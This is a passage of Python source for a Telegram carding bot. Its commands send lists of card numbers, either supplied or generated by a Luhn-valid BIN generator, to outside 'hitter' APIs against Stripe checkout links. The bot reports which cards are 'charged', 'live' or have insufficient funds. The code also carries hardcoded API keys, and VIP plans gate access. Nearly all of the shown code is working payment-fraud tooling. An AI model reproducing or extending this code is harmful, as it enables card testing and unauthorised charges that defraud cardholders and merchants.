                log_command(message, query_type='gateway', gateway='ext_stripe')
                msg = bot.reply_to(message,
                    f"<b>⏳ 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴...\n"
                    f"🌐 𝗟𝗶𝗻𝗸: <code>{checkout_url[:50]}...</code>\n"
                    f"💳 𝗖𝗮𝗿𝗱: <code>{card}</code></b>")

                start_time = time.time()
                result = _co_ext_call(checkout_url, card)
                execution_time = time.time() - start_time
                log_card_check(id, card, 'ext_stripe',
                               f"{result.get('status')} | {result.get('message')}", exec_time=execution_time)

                status_emoji = _ext_status(result)
                is_hit = status_emoji in ("✅", "💰", "⚠️")

                minux_keyboard = types.InlineKeyboardMarkup()
                minux_keyboard.add(types.InlineKeyboardButton(text="@yadistan", url="https://t.me/yadistan"))

                if is_hit:
                    _raw_msg  = result.get('message', '')
                    _raw_st   = result.get('status', '')
                    _is_3ds   = (_raw_st == '3ds' or any(k in _raw_msg.lower() for k in ('3d', 'authenticate', 'otp', 'authentication')))
                    hit_label = {
                        "✅": "Hit (Paid)",
                        "💰": "Hit (Insufficient Funds)",
                        "⚠️": "Hit (OTP Required)",
                    }.get(status_emoji, "Hit")
                    _msg_display = "OTP Required 🔐" if _is_3ds else (f"{_raw_msg} {status_emoji}" if _raw_msg else f"N/A")
                    success_url = result.get('url', '')
                    url_line = f"\n<b>Success URL:</b> <code>{success_url}</code>" if success_url else ""
                    _cc_show   = country_code if country_code not in ('N/A', '??', '', 'Unknown') else ''
                    _country_display = country if country != 'Unknown' else '—'
                    _country_line   = f"{_country_display} ({_cc_show})" if _cc_show else _country_display
                    _bank_display   = bank if bank != 'Unknown' else '—'
                    _bin_display    = bin_info if bin_info not in ('Unknown', 'Unknown - ') else '—'
                    formatted_message = (
                        f"<b>{hit_label}</b>\n"
                        f"<code>{card}</code>\n"
                        f"\n"
                        f"<b>Site:</b> {result.get('merchant', 'N/A')}\n"
                        f"<b>Amount:</b> {result.get('amount', 'N/A')}\n"
                        f"<b>Message:</b> {_msg_display}"
                        f"{url_line}\n"
                        f"\n"
                        f"<b>Bin:</b> {_bin_display}\n"
                        f"<b>Bank:</b> {_bank_display}\n"
                        f"<b>Country:</b> {_country_line}\n"
                        f"\n"
                        f"<b>Time:</b> {result.get('time', 'N/A')} | Total: {execution_time:.2f}s"
                    )
                else:
                    _st = result.get('status', '')
                    _msg = result.get('message', 'N/A')
                    if _st == '3ds' or any(k in _msg.lower() for k in ('3d', 'authenticate', 'otp', 'authentication')):
                        _display_status = "OTP Required 🔐"
                    else:
                        _display_status = f"{_msg} {status_emoji}"
                    _cc_show2        = country_code if country_code not in ('N/A', '??', '', 'Unknown') else ''
                    _country_disp2   = country if country != 'Unknown' else '—'
                    _country_line2   = f"{_country_disp2} ({_cc_show2})" if _cc_show2 else _country_disp2
                    _bank_disp2      = bank if bank != 'Unknown' else '—'
                    _bin_disp2       = bin_info if bin_info not in ('Unknown', 'Unknown - ') else '—'
                    formatted_message = (
                        f"<b>#ext_stripe 🌐\n"
                        f"━━━━━━━━━━━━━━━━━━━━\n"
                        f"[ϟ] 𝗖𝗮𝗿𝗱: <code>{card}</code>\n"
                        f"[ϟ] 𝗦𝘁𝗮𝘁𝘂𝘀: {_display_status}\n"
                        f"[ϟ] 𝗦𝗶𝘁𝗲: {result.get('merchant','N/A')}\n"
                        f"[ϟ] 𝗔𝗺𝗼𝘂𝗻𝘁: {result.get('amount','N/A')}\n"
                        f"━━━━━━━━━━━━━━━━━━━━\n"
                        f"[ϟ] 𝗕𝗶𝗻: {_bin_disp2}\n"
                        f"[ϟ] 𝗕𝗮𝗻𝗸: {_bank_disp2}\n"
                        f"[ϟ] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {_country_line2}\n"
                        f"━━━━━━━━━━━━━━━━━━━━\n"
                        f"[⌥] 𝗧𝗶𝗺𝗲: {result.get('time','N/A')} | 𝗧𝗼𝘁𝗮𝗹: {execution_time:.2f}s\n"
                        f"━━━━━━━━━━━━━━━━━━━━\n"
                        f"[⌤] Bot by @yadistan</b>"
                    )
                try:
                    bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                          text=formatted_message, reply_markup=minux_keyboard)
                except:
                    pass
                return

            # --- Multiple cards ---
            total = len(card_lines)
            live = dead = insufficient = checked = 0
            hits = []
            results_lines = []

            stop_kb = types.InlineKeyboardMarkup()
            stop_btn = types.InlineKeyboardButton(text="🛑 𝗦𝘁𝗼𝗽", callback_data='stop')
            stop_kb.add(stop_btn)

            try:
                stopuser[f'{id}']['status'] = 'start'
            except:
                stopuser[f'{id}'] = {'status': 'start'}

            log_command(message, query_type='gateway', gateway='ext_stripe_mass')
            msg = bot.reply_to(message,
                f"<b>🌐 𝗘𝘅𝘁 𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗲𝗰𝗸𝗼𝘂𝘁 𝗠𝘂𝗹𝘁𝗶\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"📋 𝗧𝗼𝘁𝗮𝗹: {total} 𝗰𝗮𝗿𝗱𝘀\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"⏳ 𝗦𝘁𝗮𝗿𝘁𝗶𝗻𝗴...</b>", reply_markup=stop_kb)

            def build_multi_msg(status_text="⏳ 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴..."):
                header = (f"<b>🌐 𝗘𝘅𝘁 𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗲𝗰𝗸𝗼𝘂𝘁 𝗠𝘂𝗹𝘁𝗶 | {status_text}\n"
                          f"━━━━━━━━━━━━━━━━━━━━\n"
                          f"📊 {checked}/{total} | ✅ {live} | 💰 {insufficient} | ❌ {dead}\n"
                          f"━━━━━━━━━━━━━━━━━━━━\n")
                body = "\n".join(results_lines[-12:])
                footer_hits = ""
                if hits:
                    _hlabels = {"✅": "Hit (Paid)", "💰": "Hit (Insufficient Funds)", "⚠️": "Hit (OTP Required)"}
                    hits_lines = "".join(
                        f"\n<b>{_hlabels.get(em,'Hit')}</b>\n"
                        f"<code>{cc}</code>\n"
                        f"<b>Site:</b> {res.get('merchant','N/A')}\n"
                        f"<b>Amount:</b> {res.get('amount','N/A')}\n"
                        f"<b>Message:</b> {res.get('message','N/A')}\n"
                        for cc, res, em in hits
                    )
                    footer_hits = f"\n━━━━━━━━━━━━━━━━━━━━\n🎯 𝗛𝗜𝗧𝗦 ({len(hits)}):" + hits_lines
                return header + body + footer_hits + "\n━━━━━━━━━━━━━━━━━━━━\n[⌤] Bot by @yadistan</b>"

            for cc in card_lines:
                if stopuser.get(f'{id}', {}).get('status') == 'stop':
                    try:
                        bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                              text=build_multi_msg("🛑 𝗦𝗧𝗢𝗣𝗣𝗘𝗗"))
                    except:
                        pass
                    return

                result = _co_ext_call(checkout_url, cc)
                checked += 1
                log_card_check(id, cc, 'ext_stripe_mass',
                               f"{result.get('status')} | {result.get('message')}")

                status_emoji = _ext_status(result)
                if status_emoji == "✅":
                    live += 1; hits.append((cc, result, status_emoji))
                elif status_emoji == "💰":
                    insufficient += 1; hits.append((cc, result, status_emoji))
                elif status_emoji == "⚠️":
                    live += 1
                else:
                    dead += 1

                results_lines.append(
                    f"{status_emoji} <b>{_ext_line(result)}</b>  ❯  <code>{cc}</code>"
                )

                try:
                    stop_kb2 = types.InlineKeyboardMarkup()
                    stop_kb2.add(types.InlineKeyboardButton(text="🛑 𝗦𝘁𝗼𝗽", callback_data='stop'))
                    bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                          text=build_multi_msg(), reply_markup=stop_kb2)
                except:
                    pass

            minux_keyboard = types.InlineKeyboardMarkup()
            minux_keyboard.add(types.InlineKeyboardButton(text="@yadistan", url="https://t.me/yadistan"))
            try:
                bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                      text=build_multi_msg("✅ 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱!"), reply_markup=minux_keyboard)
            except:
                pass
            return

        # ====== BIN MODE (auto-gen) ======
        second_parts = second_line.split()
        bin_input = second_parts[0]
        amount = int(second_parts[1]) if len(second_parts) > 1 and second_parts[1].isdigit() else 15
        if amount < 1: amount = 1
        if amount > 100: amount = 100

        has_pipe = '|' in bin_input
        if has_pipe:
            card_parts = bin_input.split('|')
            bin_base = card_parts[0].strip()
            mm_template = card_parts[1].strip() if len(card_parts) > 1 else 'xx'
            yy_template = card_parts[2].strip() if len(card_parts) > 2 else 'xx'
            cvv_template = card_parts[3].strip() if len(card_parts) > 3 else 'xxx'
        else:
            bin_base = bin_input.replace('x', '').replace('X', '')
            mm_template = 'xx'
            yy_template = 'xx'
            cvv_template = 'xxx'

        if len(bin_base.replace('x', '').replace('X', '')) < 6:
            bot.reply_to(message, "<b>❌ 𝗕𝗜𝗡 𝗺𝘂𝘀𝘁 𝗯𝗲 𝗮𝘁 𝗹𝗲𝗮𝘀𝘁 6 𝗱𝗶𝗴𝗶𝘁𝘀.</b>")
            return

        is_amex = bin_base[0] == '3'
        card_length = 15 if is_amex else 16
        cvv_length = 4 if is_amex else 3

        def luhn_check(card_number):
            digits = [int(d) for d in card_number]
            odd_digits = digits[-1::-2]
            even_digits = digits[-2::-2]
            total = sum(odd_digits)
            for d in even_digits:
                total += sum(divmod(d * 2, 10))
            return total % 10 == 0

        def generate_card():
            cc = ''
            for ch in bin_base:
                if ch.lower() == 'x':
                    cc += str(random.randint(0, 9))
                else:
                    cc += ch
            while len(cc) < card_length - 1:
                cc += str(random.randint(0, 9))
            for check_digit in range(10):
                test = cc + str(check_digit)
                if luhn_check(test):
                    cc = test
                    break
            if mm_template.lower() in ['xx', 'x', '']:
                mm = str(random.randint(1, 12)).zfill(2)
            else:
                mm = mm_template.zfill(2)
            current_year = datetime.now().year % 100
            if yy_template.lower() in ['xx', 'x', '']:
                yy = str(random.randint(current_year + 1, current_year + 5)).zfill(2)
            else:
                yy = yy_template.zfill(2)
            if cvv_template.lower() in ['xxx', 'xxxx', 'xx', 'x', '']:
                cvv = str(random.randint(1000, 9999)) if is_amex else str(random.randint(100, 999)).zfill(3)
            else:
                cvv = cvv_template.zfill(cvv_length)
            return f"{cc}|{mm}|{yy}|{cvv}"

        cards = []
        seen = set()
        attempts = 0
        while len(cards) < amount and attempts < amount * 5:
            card = generate_card()
            if card not in seen:
                seen.add(card)
                cards.append(card)
            attempts += 1

        total = len(cards)
        bin_num = bin_base[:6]
        bin_info, bank, country, country_code = get_bin_info(bin_num)

        try:
            stopuser[f'{id}']['status'] = 'start'
        except:
            stopuser[f'{id}'] = {'status': 'start'}

        stop_keyboard = types.InlineKeyboardMarkup()
        stop_keyboard.add(types.InlineKeyboardButton(text="🛑 𝗦𝘁𝗼𝗽", callback_data='stop'))

        _flag_icon   = _flag(country_code)
        _cc_display  = country_code if country_code not in ('N/A', '??', '') else ''
        _country_ln  = f"🌍 {_flag_icon} {country}" + (f"  ({_cc_display})" if _cc_display else "")
        log_command(message, query_type='gateway', gateway='ext_stripe_bin')
        msg = bot.reply_to(message,
            f"<b>⚡ EXT STRIPE × BIN GEN\n"
            f"▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
            f"🎯 BIN: <code>{bin_num}</code>   {bin_info}\n"
            f"🏦 {bank}\n"
            f"{_country_ln}   |   📋 {total} cards\n"
            f"▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
            f"⏳ Initializing...</b>", reply_markup=stop_keyboard, parse_mode='HTML')

        live = dead = insufficient = checked = 0
        three_ds = 0
        hits = []
        results_lines = []

        def build_bin_msg(status_text="⏳ Checking..."):
            pct  = int(checked / total * 100) if total else 0
            bar  = _prog_bar(checked, total, 12)
            _cc  = country_code if country_code not in ('N/A', '??', '') else ''
            _fi  = _flag_icon   # flag emoji or ''
            country_line = f"🌍 {_fi} {country}" + (f"  ({_cc})" if _cc else "")
            header = (
                f"<b>⚡ EXT STRIPE × BIN GEN  |  {status_text}\n"
                f"▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
                f"🎯 BIN: <code>{bin_num}</code>   {bin_info}\n"
                f"🏦 {bank}\n"
                f"{country_line}\n"
                f"▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
                f"[{bar}] {pct}%\n"
                f"📊 <b>{checked}/{total}</b>  ┃  ✅ <b>{live}</b>  ┃  💰 <b>{insufficient}</b>  ┃  ⚠️ <b>{three_ds}</b>  ┃  ❌ <b>{dead}</b>\n"
                f"▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
            )
            body = "\n".join(results_lines[-10:])
            footer_hits = ""
            if hits:
                _hlabels = {"✅": "Hit (Paid)", "💰": "Hit (Insufficient Funds)", "⚠️": "Hit (OTP Required)"}
                hits_block = "".join(
                    f"\n<b>{_hlabels.get(em,'Hit')}</b>\n"
                    f"<code>{cc}</code>\n"
                    f"<b>Site:</b> {res.get('merchant','N/A')}\n"
                    f"<b>Amount:</b> {res.get('amount','N/A')}\n"
                    f"<b>Message:</b> {res.get('message','N/A')}\n"
                    f"<b>Time:</b> {res.get('time','N/A')}\n"
                    for cc, res, em in hits[-6:]
                )
                footer_hits = (
                    f"\n{'▰'*20}\n"
                    f"🎯 <b>HITS ({len(hits)}):</b>"
                    + hits_block
                )
            full = header + body + footer_hits + f"\n{'▰'*20}\n<i>[⌤] Bot by @yadistan</i></b>"
            if len(full) > 4000:
                full = header + "\n".join(results_lines[-5:]) + footer_hits + f"\n<i>[⌤] @yadistan</i></b>"
            return full

        for cc in cards:
            if stopuser.get(f'{id}', {}).get('status') == 'stop':
                try:
                    bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                          text=build_bin_msg("🛑 STOPPED"), parse_mode='HTML')
                except:
                    pass
                return

            cc = cc.strip()
            result = _co_ext_call(checkout_url, cc)
            checked += 1
            log_card_check(id, cc, 'ext_stripe_bin',
                           f"{result.get('status')} | {result.get('message')}")

            status_emoji = _ext_status(result)
            if status_emoji == "✅":
                live += 1
                hits.append((cc, result, '✅'))
            elif status_emoji == "💰":
                insufficient += 1
                hits.append((cc, result, '💰'))
            elif status_emoji == "⚠️":
                three_ds += 1
                hits.append((cc, result, '⚠️'))
            else:
                dead += 1

            results_lines.append(_fmt_result_line(status_emoji, cc, result))

            try:
                stop_kb2 = types.InlineKeyboardMarkup()
                stop_kb2.add(types.InlineKeyboardButton(text="🛑 Stop", callback_data='stop'))
                bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                      text=build_bin_msg(), parse_mode='HTML', reply_markup=stop_kb2)
                time.sleep(0.3)
            except Exception:
                time.sleep(0.8)

        minux_keyboard = types.InlineKeyboardMarkup()
        minux_keyboard.add(types.InlineKeyboardButton(text="@yadistan", url="https://t.me/yadistan"))
        try:
            bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                  text=build_bin_msg("✅ DONE"), parse_mode='HTML',
                                  reply_markup=minux_keyboard)
        except:
            pass

    my_thread = threading.Thread(target=my_function)
    my_thread.start()

# ================== External API Checkout Command (/xco) ==================
# /xco — self-hosted API at EC2
_XCO_API   = "http://65.2.33.20:8099/api/stripe"
_XCO_KEY   = os.environ.get("API_SECRET_KEY", "e93247d9ba2f210de48c06138d2561f1cd8663b964c417ab")
_XCO_ALIVE = None

def _xco_api_alive():
    global _XCO_ALIVE
    if _XCO_ALIVE is True:
        return True
    try:
        r = requests.get("http://65.2.33.20:8099/api/info", timeout=8)
        _XCO_ALIVE = r.status_code == 200
    except Exception:
        _XCO_ALIVE = False
    return _XCO_ALIVE

def _xco_call(checkout_url, cc):
    """Call self-hosted API and return (emoji, plain-text for _fmt_xco_line)."""
    import re as _re2
    parts = _re2.split(r'[\|/\s]+', cc.strip())
    if len(parts) < 4:
        return "❌", "Invalid card format"
    cc_num, cc_mm, cc_yy, cc_cvv = parts[0], parts[1], parts[2], parts[3].strip()
    if len(cc_yy) == 4:
        cc_yy = cc_yy[2:]
    try:
        r = requests.post(
            _XCO_API,
            data={"cc": cc_num, "mes": cc_mm, "ano": cc_yy,
                  "cvc": cc_cvv, "link": checkout_url, "key": _XCO_KEY},
            timeout=40
        )
        raw = r.text.strip()
        low = raw.lower()
        if raw.startswith("APPROVED") or any(k in low for k in ("approved", "success")):
            emoji = "✅"
        elif raw.startswith("CCN") or any(k in low for k in ("insufficient", "funds")):
            emoji = "💰"
        elif raw.startswith("3DS") or any(k in low for k in ("3ds", "requires_action")):
            emoji = "⚠️"
        else:
            emoji = "❌"
        return emoji, raw
    except Exception as e:
        return "❌", f"Network Error: {e}"

def _fmt_xco_line(emoji, cc, resp):
    """Parse API plain-text response → short attractive Telegram line."""
    parts   = resp.split(" | ")
    msg     = parts[1].strip() if len(parts) > 1 else resp
    merchant= parts[2].strip() if len(parts) > 2 else ""
    amount  = parts[3].strip() if len(parts) > 3 else ""
    elapsed = ""
    for p in parts:
        if "Time:" in p:
            elapsed = p.replace("Time:", "").strip()
            break
    msg = (msg
           .replace("Your card was declined.", "Declined")
           .replace("Your card was declined", "Declined")
           .replace("Your card has insufficient funds.", "Insufficient Funds")
           .replace("Your card has insufficient funds", "Insufficient Funds")
           .replace("Payment Approved", "Approved ✨")
           .replace("3DS Required", "3DS Required 🔐")
           .replace("Card tokenization failed", "Invalid Card")
           .replace("Your order has been updated. Please review the updated total and submit payment again.", "Order Updated")
           .replace("Your order has been updated.", "Order Updated"))
    meta = []
    if merchant and merchant not in ("N/A", ""):
        meta.append(merchant)
    if amount and amount not in ("N/A", ""):
        meta.append(amount)
    if elapsed:
        meta.append(f"⏱{elapsed}")
    meta_str = "  •  ".join(meta)
    line = f"{emoji} <code>{cc}</code>"
    if meta_str:
        return f"{line}\n    ┗ {msg}  •  {meta_str}"
    return f"{line}\n    ┗ {msg}"


# ================== /h — Hitter API (gold-newt hitter.php) ==================
@bot.message_handler(commands=["h"])
def h_command(message):
    def my_function():
        id = message.from_user.id
        with open("data.json", 'r', encoding='utf-8') as file:
            json_data = json.load(file)
        try:
            BL = json_data[str(id)]['plan']
        except:
            BL = '𝗙𝗥𝗘𝗘'

        if BL == '𝗙𝗥𝗘𝗘' and id != admin:
            bot.reply_to(message, "<b>❌ This command is only for VIP users.</b>", parse_mode='HTML')
            return

        allowed, wait = check_rate_limit(id, BL)
        if not allowed:
            bot.reply_to(message, f"<b>⏱️ Wait {wait}s before next check.</b>", parse_mode='HTML')
            return

        usage_msg = (
            "<b>🎯 <u>Hitter Checker</u>\n\n"
            "━━━━━━━━━━━━━━━━\n"
            "📌 <b>Single / Multi Card:</b>\n"
            "<code>/h https://checkout.stripe.com/xxx\n"
            "4111111111111111|12|26|123</code>\n\n"
            "📌 <b>Reply to /gen message:</b>\n"
            "Reply to any CC message → <code>/h https://...</code>\n\n"
            "📌 <b>Reply to .txt file:</b>\n"
            "Reply to .txt → <code>/h https://...</code>\n"
            "━━━━━━━━━━━━━━━━</b>"
        )

        replied = message.reply_to_message

        # ── Helper: run multi-card check loop ──────────────────────────
        def _run_bulk(checkout_url, card_lines, src_label):
            total = len(card_lines)
            live = dead = insufficient = checked = 0
            hits = []
            results_lines = []

            stop_kb = types.InlineKeyboardMarkup()
            stop_kb.add(types.InlineKeyboardButton(text="🛑 Stop", callback_data='stop'))
            try:
                stopuser[f'{id}']['status'] = 'start'
            except:
                stopuser[f'{id}'] = {'status': 'start'}

            log_command(message, query_type='gateway', gateway='h_hitter')
            msg = bot.reply_to(message,
                f"<b>🎯 Hitter → {src_label}\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"📋 Total: {total} cards\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"⏳ Starting...</b>",
                reply_markup=stop_kb, parse_mode='HTML')

            def build_h_msg(status_text="⏳ Checking..."):
                header = (f"<b>🎯 Hitter | {status_text}\n"
                          f"━━━━━━━━━━━━━━━━━━━━\n"
                          f"📋 {src_label}\n"
                          f"📊 {checked}/{total} | ✅ {live} | 💰 {insufficient} | ❌ {dead}\n"
                          f"━━━━━━━━━━━━━━━━━━━━\n")
                body = "\n".join(results_lines[-10:])
                footer_hits = ""
                if hits:
                    hits_lines = "".join(
                        f"\n<b>Hit ({_h_word(res)})</b>\n<code>{cc}</code>\n"
                        f"<b>Merchant:</b> {res.get('merchant','N/A')}  •  <b>Amount:</b> {res.get('amount','N/A')}\n"
                        f"<b>Message:</b> {res.get('message','N/A')[:100]}\n"
                        for cc, res, em in hits[-8:]
                    )
                    footer_hits = f"\n━━━━━━━━━━━━━━━━━━━━\n🎯 HITS ({len(hits)}):" + hits_lines
                full = header + body + footer_hits + "\n━━━━━━━━━━━━━━━━━━━━\n[⌤] Bot by @yadistan</b>"
                if len(full) > 4000:
                    full = header + "\n".join(results_lines[-5:]) + footer_hits + "\n[⌤] Bot by @yadistan</b>"
                return full

            for cc in card_lines:
                if stopuser.get(f'{id}', {}).get('status') == 'stop':
                    try:
                        bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                              text=build_h_msg("🛑 STOPPED"), parse_mode='HTML')
                    except: pass
                    return

                cc = cc.strip()
                result = _h_call(checkout_url, cc)
                checked += 1
                log_card_check(id, cc, 'h_hitter', result.get('raw', '')[:80])

                em   = _h_emoji(result)
                word = _h_word(result)
                if em == "✅":
                    live += 1
                    hits.append((cc, result, em))
                elif em == "💰":
                    insufficient += 1
                    hits.append((cc, result, em))
                elif em == "⚠️":
                    live += 1
                    hits.append((cc, result, em))
                else:
                    dead += 1

                results_lines.append(f"{em} <b>{word}</b>  ❯  <code>{cc}</code>")

                if checked % 5 == 0 or checked == total:
                    try:
                        bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                              text=build_h_msg(), parse_mode='HTML',
                                              reply_markup=stop_kb)
                        time.sleep(0.5)
                    except Exception:
                        time.sleep(1)

            try:
                bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                      text=build_h_msg("✅ DONE"), parse_mode='HTML')
            except: pass

        # ── Mode 1: Reply to .txt file ──────────────────────────────────
        if (replied and replied.document
                and replied.document.file_name
                and replied.document.file_name.lower().endswith('.txt')):
            txt_parts = message.text.split()
            if len(txt_parts) < 2:
                bot.reply_to(message,
                    "<b>❌ URL missing.\n\nUsage: reply to .txt file with:\n"
                    "<code>/h https://checkout.stripe.com/xxx</code></b>", parse_mode='HTML')
                return
            checkout_url = txt_parts[1].strip()
            if not checkout_url.startswith('http'):
                bot.reply_to(message, "<b>❌ Invalid URL.</b>", parse_mode='HTML')
                return
            wm = bot.reply_to(message, "<b>⏳ Downloading file...</b>", parse_mode='HTML')
            try:
                fi = bot.get_file(replied.document.file_id)
                dl = bot.download_file(fi.file_path)
                raw_txt = dl.decode('utf-8', errors='ignore')
            except Exception as e:
                bot.edit_message_text(f"<b>❌ Download failed: {str(e)[:80]}</b>",
                                      chat_id=message.chat.id, message_id=wm.message_id,
                                      parse_mode='HTML')
                return
            bot.delete_message(message.chat.id, wm.message_id)
            card_lines = [_extract_cc(l.strip()) for l in raw_txt.splitlines() if _extract_cc(l.strip())]
            if not card_lines:
                bot.reply_to(message, "<b>❌ No valid CCs found in file.</b>", parse_mode='HTML')
                return
            _run_bulk(checkout_url, card_lines, f"📄 {replied.document.file_name} ({len(card_lines)} cards)")
            return

        # ── Mode 2: Reply to gen/CC text message ────────────────────────
        if replied and not (replied.document and replied.document.file_name
                            and replied.document.file_name.lower().endswith('.txt')):
            cmd_parts = message.text.split()
            if len(cmd_parts) >= 2 and cmd_parts[1].startswith('http'):
                replied_text = replied.text or replied.caption or ""
                reply_cards = []
                seen_r = set()
                for _rl in replied_text.splitlines():
                    _cc = _extract_cc(_rl.strip())
                    if _cc and _cc not in seen_r:
                        reply_cards.append(_cc)
                        seen_r.add(_cc)
                if reply_cards:
                    _run_bulk(cmd_parts[1], reply_cards, f"📋 Message ({len(reply_cards)} cards)")
                    return

        # ── Mode 3: Inline URL + card(s) ────────────────────────────────
        try:
            lines    = message.text.split('\n')
            first_rest = lines[0].split(' ', 1)
            if len(first_rest) < 2:
                raise IndexError
            if len(lines) > 1:
                checkout_url = first_rest[1].strip()
                raw_lines    = [l.strip() for l in lines[1:] if l.strip()]
            else:
                parts2 = first_rest[1].strip().split()
                if len(parts2) < 2:
                    raise IndexError
                checkout_url = parts2[0]
                raw_lines    = [' '.join(parts2[1:])]
        except (IndexError, ValueError):
            bot.reply_to(message, usage_msg, parse_mode='HTML')
            return

        if not checkout_url.startswith('http'):
            bot.reply_to(message, "<b>❌ Invalid URL.</b>", parse_mode='HTML')
            return

        card_lines = []
        for _rl in raw_lines:
            _cc = _extract_cc(_rl)
            if _cc:
                card_lines.append(_cc)

        if not card_lines:
            bot.reply_to(message, usage_msg, parse_mode='HTML')
            return

        # Multi-card inline
        if len(card_lines) > 1:
            _run_bulk(checkout_url, card_lines, f"Inline ({len(card_lines)} cards)")
            return

        # Single card
        card = card_lines[0]
        bin_num = card.replace('|', '')[:6]
        bin_info, bank, country, country_code = get_bin_info(bin_num)
        log_command(message, query_type='gateway', gateway='h_hitter')
        msg = bot.reply_to(message,
            f"<b>⏳ Checking...\n"
            f"🎯 Link: <code>{checkout_url[:50]}...</code>\n"
            f"💳 Card: <code>{card}</code></b>", parse_mode='HTML')

        import time as _t
        t0 = _t.time()
        result = _h_call(checkout_url, card)
        elapsed = round(_t.time() - t0, 2)
        log_card_check(id, card, 'h_hitter', result.get('raw', '')[:80])

        em   = _h_emoji(result)
        word = _h_word(result)
        is_hit = em in ("✅", "💰", "⚠️")

        out = (
            f"<b>{em} {word}  ❯  <code>{card}</code>\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"🏦 BIN: {bin_num}  •  {bin_info}\n"
            f"🏛️ Bank: {bank}\n"
            f"🌍 Country: {country} {country_code}\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"🏪 Merchant: {result.get('merchant','N/A')}\n"
            f"💵 Amount: {result.get('amount','N/A')}\n"
            f"📝 Message: {result.get('message','N/A')[:150]}\n"
            f"⏱️ Time: {result.get('time', f'{elapsed}s')}\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"[⌤] Bot by @yadistan</b>"
        )
        try:
            bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                  text=out, parse_mode='HTML')
        except:
            bot.reply_to(message, out, parse_mode='HTML')

    my_thread = threading.Thread(target=my_function)
    my_thread.start()

# ================== /ah — Auto Hitter (hitter1month.replit.app) ==================
_AH_API = "https://hitter1month.replit.app"
_AH_KEY = os.environ.get("AH_KEY", "hitchk_01aba06e952fe2d584de7786790b7b96e55a42b002c6afcf")
_ah_session_cache = {}   # uid → session_cache (speeds up consecutive cards)

def _ah_gate(url):
    """Auto-detect gate type from URL."""
    u = url.lower()
    if "invoice" in u:    return "invoice"
    if "billing" in u:    return "billing"
    return "checkout"

def _ah_call(url, card, uid=None):
    """Call Auto Hitter API. Returns dict with status/message/elapsed/card_info."""
    gate    = _ah_gate(url)
    payload = {
        "url":           url,
        "card":          card,
        "session_cache": _ah_session_cache.get(uid) if uid else None,
    }
    try:
        r = requests.post(
            f"{_AH_API}/hit/{gate}",
            json=payload,
            headers={"X-API-Key": _AH_KEY, "Content-Type": "application/json"},
            timeout=120
        )
        d = r.json()
        if uid and d.get("session_cache"):
            _ah_session_cache[uid] = d["session_cache"]
        return d
    except Exception as e:
        return {"status": "error", "message": str(e)[:100], "elapsed": 0, "card_info": None}

def _ah_emoji(d):
    s = d.get("status", "").lower()
    if s in ("charged", "approved"): return "✅"
    if s == "live":                   return "⚡"
    if s == "live_declined":          return "⚠️"
    if s == "error":                  return "🔴"
    return "❌"

def _ah_word(d):
    s = d.get("status", "").lower()
    if s in ("charged", "approved"): return "Charged"
    if s == "live":                   return "Live"
    if s == "live_declined":          return "Live/Declined"
    if s == "error":                  return "Error"
    return "Dead"

@bot.message_handler(commands=["ah"])
def ah_command(message):
    def my_function():
        id = message.from_user.id
        with open("data.json", 'r', encoding='utf-8') as f:
            json_data = json.load(f)
        try:
            BL = json_data[str(id)]['plan']
        except:
            BL = '𝗙𝗥𝗘𝗘'

        if BL == '𝗙𝗥𝗘𝗘' and id != admin:
            bot.reply_to(message, "<b>❌ This command is only for VIP users.</b>", parse_mode='HTML')
            return

        allowed, wait = check_rate_limit(id, BL)
        if not allowed:
            bot.reply_to(message, f"<b>⏱️ Wait {wait}s before next check.</b>", parse_mode='HTML')
            return

        usage_msg = (
            "<b>🔥 <u>Auto Hitter</u>\n\n"
            "━━━━━━━━━━━━━━━━\n"
            "📌 <b>Single / Multi Card:</b>\n"
            "<code>/ah https://checkout.stripe.com/xxx\n"
            "4111111111111111|12|26|123</code>\n\n"
            "📌 <b>Reply to /gen message:</b>\n"
            "Reply to gen message → <code>/ah https://...</code>\n\n"
            "📌 <b>Reply to .txt file:</b>\n"
            "Reply to .txt → <code>/ah https://...</code>\n\n"
            "Gates: checkout · invoice · billing (auto-detected from URL)\n"
            "━━━━━━━━━━━━━━━━</b>"
        )

        replied = message.reply_to_message

        # ── Bulk checker helper ─────────────────────────────────────────
        def _run_ah_bulk(checkout_url, card_lines, src_label):
            gate  = _ah_gate(checkout_url)
            total = len(card_lines)
            charged = live = dead = err = checked = 0
            hits = []
            results_lines = []

            stop_kb = types.InlineKeyboardMarkup()
            stop_kb.add(types.InlineKeyboardButton(text="🛑 Stop", callback_data='stop'))
            try:
                stopuser[f'{id}']['status'] = 'start'
            except:
                stopuser[f'{id}'] = {'status': 'start'}

            log_command(message, query_type='gateway', gateway='ah_hitter')
            msg = bot.reply_to(message,
